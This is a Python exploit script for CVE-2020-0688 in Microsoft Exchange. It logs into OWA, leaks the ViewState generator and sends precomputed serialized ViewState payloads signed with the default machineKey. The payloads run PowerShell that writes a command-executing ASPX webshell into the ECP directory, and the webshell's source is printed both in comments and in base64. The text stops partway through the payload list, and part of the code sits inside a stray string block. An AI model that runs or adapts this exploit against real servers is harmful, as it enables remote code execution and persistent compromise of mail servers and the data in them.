import urllib.parse
import requests
import os
import re
import sys
import base64
import subprocess
import argparse
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__AUTHOR__ = "github.com/w4fz5uck5"
__EXPLOIT__ = ("github.com/zcgonvh/CVE-2020-0688", "github.com/Ridter/cve-2020-0688")

def CraftREQ(target, data=None, method="", cookies=None, proxy=None):
    """Craft URL POST/GET Request, then return it"""
    if method == "POST":
        req = requests.post
    else:
        req = requests.get   
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    resp = req(
        target, data=data, headers=headers, cookies=cookies,
        verify=False, allow_redirects=False, proxies=proxy
     )
    return resp, dict(resp.cookies.items())

def LoginExchange(target, user, password, proxy=None):
    """Login into Exchange service"""
    login_url = "%s/owa/auth.owa" % target
    data = (
        "destination=" + urllib.parse.quote(target) + "%2Fecp%2F&flags=4&forcedownlevel=0" 
        "&username=" + user + "&password=" + password + "&passwordText=&isUtf8=1"
    )
    try:
        resp, cookies = CraftREQ(login_url, data=data, method="POST", cookies=None, proxy=proxy)
        if resp.status_code == 302:
            print("\n[+] GOT RESPONSE | code:[%s] | length:[%s]" % (resp.status_code, len(resp.text)))
            return cookies
        else:
            print("\n[-] GOT UNKNOW RESPONSE | code:[%s] | length:[%s]" % (resp.status_code, len(resp.text)))
        return False
    except Exception as e:
        print("\n[-] Failed Attempt to login w/ [%s:%s]\n%s" % (user, password, str(e)))
        return False

def LeakView(target, cookies=None):
    """Leak __VIEWSTATEGENERATOR value"""
    target += "/ecp/default.aspx"       
    resp, cookies = CraftREQ(target, method="GET", cookies=cookies, proxy=proxy)
    key = cookies["ASP.NET_SessionId"]
    print("\n[+] Utilizing valid session key [ASP.NET_SessionId]: [%s]" % key)
    # https://github.com/Ridter/cve-2020-0688
    try:
        _vsg = re.compile(
            'id="__VIEWSTATEGENERATOR" value="(.+?)"').findall(str(resp.text))[0]
        print("[+] Done! VIEWSTATEGENERATOR: " + _vsg)
    except:
        _vsg = "B97B4E27"
        print("\n[*] Could not find viewstategenerator, trying default value: [%s]" % _vsg)
    return _vsg, key, cookies

def  exploit():
    """Upload webshell without yososerial.net usage"""
    user_session_cookie = LoginExchange(target, user, password, proxy=proxy)
    _vsg, key, cookies = LeakView(target, cookies=user_session_cookie)
    print("\n[+] %s Seems vulnerable!\n[!] Uploading C# ASPX webshell!\n" % target)
    new_cookie = user_session_cookie
    new_cookie["ASP.NET_SessionId"] = ""
    #new_cookie["ASP.NET_SessionId"] = str(key) # Set-Cookie("ASP.NET_SessionId=xxxx")
    # Bypass VIEWSTATE default size limit value with crafted payload
    #
    # https://github.com/ravinacademy/CVE-2020-0688
    #
    # L1. <%@page language="C#"%><%@ import Namespace="System.IO"%><%@ import Namespace="System.Xml"%><%@ import Namespace="System.Xml.Xsl"%><%string xml=@"<?xml version=""1.0""?>
    # L2. <root>test</root>";string xslt=@"<?xml version='1.0'?><xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:zcg=""zcgonvh"">
    # L3. <msxsl:script language=""JScript"" implements-prefix=""zcg""><msxsl:assembly name=""mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/>
    # L4. <msxsl:assembly name=""System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/>
    # L5. <msxsl:assembly name=""System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/><msxsl:assembly name=""System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/>
    # L6. <![CDATA[function xml(){var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var command = Request.Item['cmd'];var r = new ActiveXObject(""WScript.Shell"").Exec(""cmd /c ""+command);var OutStream = r.StdOut;var Str = """";
    # L7. while (!OutStream.atEndOfStream){Str = Str + OutStream.readAll();} Response.Write(""<pre>""+Str+""</pre>"");}]]> </msxsl:script><xsl:template match=""/root""> <xsl:value-of select=""zcg:xml()""/>
    # L8. </xsl:template></xsl:stylesheet>";XmlDocument xmldoc=new XmlDocument();xmldoc.LoadXml(xml);XmlDocument xsldoc=new XmlDocument();xsldoc.LoadXml(xslt);
    # L9. XsltSettings xslt_settings = new XsltSettings(false, true);xslt_settings.EnableScript = true;XslCompiledTransform xct=new XslCompiledTransform();xct.Load(xsldoc,xslt_settings,new XmlUrlResolver());xct.Transform(xmldoc,null,new MemoryStream());%>
    """
    # /ecp/web.config
    # <...snip...>
    # <machineKey validationKey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" decryptionKey="E9D2490BD0075B51D1BA5288514514AF" validation="SHA1" decryption="3DES" />
    # <...snip...>
    encoded_xmls = [
        "PCVAcGFnZSBsYW5ndWFnZT0iQyMiJT48JUAgaW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLklPIiU+PCVAIGltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5YbWwiJT48JUAgaW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLlhtbC5Yc2wiJT48JXN0cmluZyB4bWw9QCI8P3htbCB2ZXJzaW9uPSIiMS4wIiI/Pg==",
        "PHJvb3Q+dGVzdDwvcm9vdD4iO3N0cmluZyB4c2x0PUAiPD94bWwgdmVyc2lvbj0nMS4wJz8+PHhzbDpzdHlsZXNoZWV0IHZlcnNpb249IiIxLjAiIiB4bWxuczp4c2w9IiJodHRwOi8vd3d3LnczLm9yZy8xOTk5L1hTTC9UcmFuc2Zvcm0iIiB4bWxuczptc3hzbD0iInVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206eHNsdCIiIHhtbG5zOnpjZz0iInpjZ29udmgiIj4=",
        "PG1zeHNsOnNjcmlwdCBsYW5ndWFnZT0iIkpTY3JpcHQiIiBpbXBsZW1lbnRzLXByZWZpeD0iInpjZyIiPjxtc3hzbDphc3NlbWJseSBuYW1lPSIibXNjb3JsaWIsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5IiIvPg==",
        "PG1zeHNsOmFzc2VtYmx5IG5hbWU9IiJTeXN0ZW0uRGF0YSwgVmVyc2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkiIi8+",
        "PG1zeHNsOmFzc2VtYmx5IG5hbWU9IiJTeXN0ZW0uQ29uZmlndXJhdGlvbiwgVmVyc2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWIwM2Y1ZjdmMTFkNTBhM2EiIi8+PG1zeHNsOmFzc2VtYmx5IG5hbWU9IiJTeXN0ZW0uV2ViLCBWZXJzaW9uPTIuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYSIiLz4=",
        "PCFbQ0RBVEFbZnVuY3Rpb24geG1sKCl7dmFyIGM9U3lzdGVtLldlYi5IdHRwQ29udGV4dC5DdXJyZW50O3ZhciBSZXF1ZXN0PWMuUmVxdWVzdDt2YXIgUmVzcG9uc2U9Yy5SZXNwb25zZTt2YXIgY29tbWFuZCA9IFJlcXVlc3QuSXRlbVsnY21kJ107dmFyIHIgPSBuZXcgQWN0aXZlWE9iamVjdCgiIldTY3JpcHQuU2hlbGwiIikuRXhlYygiImNtZCAvYyAiIitjb21tYW5kKTt2YXIgT3V0U3RyZWFtID0gci5TdGRPdXQ7dmFyIFN0ciA9ICIiIiI7Cg==",
        "d2hpbGUgKCFPdXRTdHJlYW0uYXRFbmRPZlN0cmVhbSl7U3RyID0gU3RyICsgT3V0U3RyZWFtLnJlYWRBbGwoKTt9IFJlc3BvbnNlLldyaXRlKCIiPHByZT4iIitTdHIrIiI8L3ByZT4iIik7fV1dPiA8L21zeHNsOnNjcmlwdD48eHNsOnRlbXBsYXRlIG1hdGNoPSIiL3Jvb3QiIj4gPHhzbDp2YWx1ZS1vZiBzZWxlY3Q9IiJ6Y2c6eG1sKCkiIi8+",
        "PC94c2w6dGVtcGxhdGU+PC94c2w6c3R5bGVzaGVldD4iO1htbERvY3VtZW50IHhtbGRvYz1uZXcgWG1sRG9jdW1lbnQoKTt4bWxkb2MuTG9hZFhtbCh4bWwpO1htbERvY3VtZW50IHhzbGRvYz1uZXcgWG1sRG9jdW1lbnQoKTt4c2xkb2MuTG9hZFhtbCh4c2x0KTs=",
        "WHNsdFNldHRpbmdzIHhzbHRfc2V0dGluZ3MgPSBuZXcgWHNsdFNldHRpbmdzKGZhbHNlLCB0cnVlKTt4c2x0X3NldHRpbmdzLkVuYWJsZVNjcmlwdCA9IHRydWU7WHNsQ29tcGlsZWRUcmFuc2Zvcm0geGN0PW5ldyBYc2xDb21waWxlZFRyYW5zZm9ybSgpO3hjdC5Mb2FkKHhzbGRvYyx4c2x0X3NldHRpbmdzLG5ldyBYbWxVcmxSZXNvbHZlcigpKTt4Y3QuVHJhbnNmb3JtKHhtbGRvYyxudWxsLG5ldyBNZW1vcnlTdHJlYW0oKSk7JT4K"
    ]
    for ex in encoded_xmls:
        cmd = (
              f\"""powershell -nop -ep bypass -c \\"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{ex}'))\\" >> \\"%exchangeinstallpath%\\\\ClientAccess\\\\ecp\\\\HybridLogout.aspx\\" ""\"
        )
        ysoserial = (
            #'/ysoserial/ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "%s" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="%s" --viewstateuserkey="%s" --isdebug â€“islegacy' % (cmd, _vsg, key)
            '/ysoserial/ysoserial.exe --minify -p ViewState -g TextFormattingRunProperties -f binaryformatter -c "%s" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --decryptionkey="E9D2490BD0075B51D1BA5288514514AF" --generator="%s"' % (cmd, _vsg)
        )
        output = subprocess.Popen(os.getcwd() + ysoserial, stdout=subprocess.PIPE).stdout.read()
        output = re.compile(
            "(\/wE.*)").findall(str(output))[0].rstrip("\n")
        output = output.replace("'", "")
        rce_url = (
            target + "/ecp/default.aspx?__VIEWSTATEGENERATOR=" + _vsg + "&__VIEWSTATE=" + urllib.parse.quote(output)
        )
        resp, _ = CraftREQ(rce_url, method="GET", cookies=new_cookie, proxy=proxy)
    """
    # webshell upload
    viewstate_bins = [
        "/wEyvgcAAQAAAP////8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAAKMGPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6YT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjxhOlByb2Nlc3M%2BPGE6UHJvY2Vzcy5TdGFydEluZm8%2BPGE6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLW5vcCAtZXAgYnlwYXNzIC1jICZxdW90O1tTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJ1BDVkFjR0ZuWlNCc1lXNW5kV0ZuWlQwaVF5TWlKVDQ4SlVBZ2FXMXdiM0owSUU1aGJXVnpjR0ZqWlQwaVUzbHpkR1Z0TGtsUElpVStQQ1ZBSUdsdGNHOXlkQ0JPWVcxbGMzQmhZMlU5SWxONWMzUmxiUzVZYld3aUpUNDhKVUFnYVcxd2IzSjBJRTVoYldWemNHRmpaVDBpVTNsemRHVnRMbGh0YkM1WWMyd2lKVDQ4SlhOMGNtbHVaeUI0Yld3OVFDSThQM2h0YkNCMlpYSnphVzl1UFNJaU1TNHdJaUkvUGc9PScpKSZxdW90OyAmZ3Q7Jmd0OyAmcXVvdDslZXhjaGFuZ2VpbnN0YWxscGF0aCVcXENsaWVudEFjY2Vzc1xcZWNwXFxIeWJyaWRMb2dvdXQuYXNweCZxdW90OyIgRmlsZU5hbWU9ImNtZCIvPjwvYTpQcm9jZXNzLlN0YXJ0SW5mbz48L2E6UHJvY2Vzcz48L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT48L09iamVjdERhdGFQcm92aWRlcj4LookYYGQfs4T9cEBz0zG2l8lQOs0%3D",
        "/wEy7gcAAQAAAP////8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAANMGPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6YT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjxhOlByb2Nlc3M%2BPGE6UHJvY2Vzcy5TdGFydEluZm8%2BPGE6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLW5vcCAtZXAgYnlwYXNzIC1jICZxdW90O1tTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJ1BISnZiM1ErZEdWemREd3ZjbTl2ZEQ0aU8zTjBjbWx1WnlCNGMyeDBQVUFpUEQ5NGJXd2dkbVZ5YzJsdmJqMG5NUzR3Sno4K1BIaHpiRHB6ZEhsc1pYTm9aV1YwSUhabGNuTnBiMjQ5SWlJeExqQWlJaUI0Yld4dWN6cDRjMnc5SWlKb2RIUndPaTh2ZDNkM0xuY3pMbTl5Wnk4eE9UazVMMWhUVEM5VWNtRnVjMlp2Y20waUlpQjRiV3h1Y3pwdGMzaHpiRDBpSW5WeWJqcHpZMmhsYldGekxXMXBZM0p2YzI5bWRDMWpiMjA2ZUhOc2RDSWlJSGh0Ykc1ek9ucGpaejBpSW5waloyOXVkbWdpSWo0PScpKSZxdW90OyAmZ3Q7Jmd0OyAmcXVvdDslZXhjaGFuZ2VpbnN0YWxscGF0aCVcXENsaWVudEFjY2Vzc1xcZWNwXFxIeWJyaWRMb2dvdXQuYXNweCZxdW90OyIgRmlsZU5hbWU9ImNtZCIvPjwvYTpQcm9jZXNzLlN0YXJ0SW5mbz48L2E6UHJvY2Vzcz48L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT48L09iamVjdERhdGFQcm92aWRlcj4LP5Lj7m0SmAkRy2yaFFMQM49jOac%3D",
        "/wEytgcAAQAAAP////8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAAJsGPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6YT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjxhOlByb2Nlc3M%2BPGE6UHJvY2Vzcy5TdGFydEluZm8%2BPGE6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLW5vcCAtZXAgYnlwYXNzIC1jICZxdW90O1tTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJ1BHMXplSE5zT25OamNtbHdkQ0JzWVc1bmRXRm5aVDBpSWtwVFkzSnBjSFFpSWlCcGJYQnNaVzFsYm5SekxYQnlaV1pwZUQwaUlucGpaeUlpUGp4dGMzaHpiRHBoYzNObGJXSnNlU0J1WVcxbFBTSWliWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlNaTR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1SWlJdlBnPT0nKSkmcXVvdDsgJmd0OyZndDsgJnF1b3Q7JWV4Y2hhbmdlaW5zdGFsbHBhdGglXFxDbGllbnRBY2Nlc3NcXGVjcFxcSHlicmlkTG9nb3V0LmFzcHgmcXVvdDsiIEZpbGVOYW1lPSJjbWQiLz48L2E6UHJvY2Vzcy5TdGFydEluZm8%2BPC9hOlByb2Nlc3M%2BPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BPC9PYmplY3REYXRhUHJvdmlkZXI%2BC3mYUa6YLmnFRfs2gSLppTkQOvLr",
        "/wEy5gYAAQAAAP////8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAAMsFPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6YT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjxhOlByb2Nlc3M%2BPGE6UHJvY2Vzcy5TdGFydEluZm8%2BPGE6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLW5vcCAtZXAgYnlwYXNzIC1jICZxdW90O1tTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJ1BHMXplSE5zT21GemMyVnRZbXg1SUc1aGJXVTlJaUpUZVhOMFpXMHVSR0YwWVN3Z1ZtVnljMmx2YmoweUxqQXVNQzR3TENCRGRXeDBkWEpsUFc1bGRYUnlZV3dzSUZCMVlteHBZMHRsZVZSdmEyVnVQV0kzTjJFMVl6VTJNVGt6TkdVd09Ea2lJaTgrJykpJnF1b3Q7ICZndDsmZ3Q7ICZxdW90OyVleGNoYW5nZWluc3RhbGxwYXRoJVxcQ2xpZW50QWNjZXNzXFxlY3BcXEh5YnJpZExvZ291dC5hc3B4JnF1b3Q7IiBGaWxlTmFtZT0iY21kIi8%2BPC9hOlByb2Nlc3MuU3RhcnRJbmZvPjwvYTpQcm9jZXNzPjwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjwvT2JqZWN0RGF0YVByb3ZpZGVyPgtGEsmJ2FQLaF%2BZPTMinXtB5jQT5A%3D%3D",
        "/wEy/gcAAQAAAP////8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAAOMGPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6YT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjxhOlByb2Nlc3M%2BPGE6UHJvY2Vzcy5TdGFydEluZm8%2BPGE6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLW5vcCAtZXAgYnlwYXNzIC1jICZxdW90O1tTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJ1BHMXplSE5zT21GemMyVnRZbXg1SUc1aGJXVTlJaUpUZVhOMFpXMHVRMjl1Wm1sbmRYSmhkR2x2Yml3Z1ZtVnljMmx2YmoweUxqQXVNQzR3TENCRGRXeDBkWEpsUFc1bGRYUnlZV3dzSUZCMVlteHBZMHRsZVZSdmEyVnVQV0l3TTJZMVpqZG1NVEZrTlRCaE0yRWlJaTgrUEcxemVITnNPbUZ6YzJWdFlteDVJRzVoYldVOUlpSlRlWE4wWlcwdVYyVmlMQ0JXWlhKemFXOXVQVEl1TUM0d0xqQXNJRU4xYkhSMWNtVTlibVYxZEhKaGJDd2dVSFZpYkdsalMyVjVWRzlyWlc0OVlqQXpaalZtTjJZeE1XUTFNR0V6WVNJaUx6ND0nKSkmcXVvdDsgJmd0OyZndDsgJnF1b3Q7JWV4Y2hhbmdlaW5zdGFsbHBhdGglXFxDbGllbnRBY2Nlc3NcXGVjcFxcSHlicmlkTG9nb3V0LmFzcHgmcXVvdDsiIEZpbGVOYW1lPSJjbWQiLz48L2E6UHJvY2Vzcy5TdGFydEluZm8%2BPC9hOlByb2Nlc3M%2BPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BPC9PYmplY3REYXRhUHJvdmlkZXI%2BCyFchxU0bbfBGFmu8p565He0t3dw",
        "/wEyrggAAQAAAP////8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAAJMHPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6YT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjxhOlByb2Nlc3M%2BPGE6UHJvY2Vzcy5TdGFydEluZm8%2BPGE6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLW5vcCAtZXAgYnlwYXNzIC1jICZxdW90O1tTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJ1BDRmJRMFJCVkVGYlpuVnVZM1JwYjI0Z2VHMXNLQ2w3ZG1GeUlHTTlVM2x6ZEdWdExsZGxZaTVJZEhSd1EyOXVkR1Y0ZEM1RGRYSnlaVzUwTzNaaGNpQlNaWEYxWlhOMFBXTXVVbVZ4ZFdWemREdDJZWElnVW1WemNHOXVjMlU5WXk1U1pYTndiMjV6WlR0MllYSWdZMjl0YldGdVpDQTlJRkpsY1hWbGMzUXVTWFJsYlZzblkyMWtKMTA3ZG1GeUlISWdQU0J1WlhjZ1FXTjBhWFpsV0U5aWFtVmpkQ2dpSWxkVFkzSnBjSFF1VTJobGJHd2lJaWt1UlhobFl5Z2lJbU50WkNBdll5QWlJaXRqYjIxdFlXNWtLVHQyWVhJZ1QzVjBVM1J5WldGdElEMGdjaTVUZEdSUGRYUTdkbUZ5SUZOMGNpQTlJQ0lpSWlJN0NnPT0nKSkmcXVvdDsgJmd0OyZndDsgJnF1b3Q7JWV4Y2hhbmdlaW5zdGFsbHBhdGglXFxDbGllbnRBY2Nlc3NcXGVjcFxcSHlicmlkTG9nb3V0LmFzcHgmcXVvdDsiIEZpbGVOYW1lPSJjbWQiLz48L2E6UHJvY2Vzcy5TdGFydEluZm8%2BPC9hOlByb2Nlc3M%2BPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BPC9PYmplY3REYXRhUHJvdmlkZXI%2BCz9gwv9zGTa0IiKQTehqj193YZZr",
        "/wEy3gcAAQAAAP////8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAAMMGPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6YT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjxhOlByb2Nlc3M%2BPGE6UHJvY2Vzcy5TdGFydEluZm8%2BPGE6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLW5vcCAtZXAgYnlwYXNzIC1jICZxdW90O1tTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJ2QyaHBiR1VnS0NGUGRYUlRkSEpsWVcwdVlYUkZibVJQWmxOMGNtVmhiU2w3VTNSeUlEMGdVM1J5SUNzZ1QzVjBVM1J5WldGdExuSmxZV1JCYkd3b0tUdDlJRkpsYzNCdmJuTmxMbGR5YVhSbEtDSWlQSEJ5WlQ0aUlpdFRkSElySWlJOEwzQnlaVDRpSWlrN2ZWMWRQaUE4TDIxemVITnNPbk5qY21sd2RENDhlSE5zT25SbGJYQnNZWFJsSUcxaGRHTm9QU0lpTDNKdmIzUWlJajRnUEhoemJEcDJZV3gxWlMxdlppQnpaV3hsWTNROUlpSjZZMmM2ZUcxc0tDa2lJaTgrJykpJnF1b3Q7ICZndDsmZ3Q7ICZxdW90OyVleGNoYW5nZWluc3RhbGxwYXRoJVxcQ2xpZW50QWNjZXNzXFxlY3BcXEh5YnJpZExvZ291dC5hc3B4JnF1b3Q7IiBGaWxlTmFtZT0iY21kIi8%2BPC9hOlByb2Nlc3MuU3RhcnRJbmZvPjwvYTpQcm9jZXNzPjwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjwvT2JqZWN0RGF0YVByb3ZpZGVyPguDEpdHBHgCNeexmoF2HqhlgKWUqg%3D%3D",
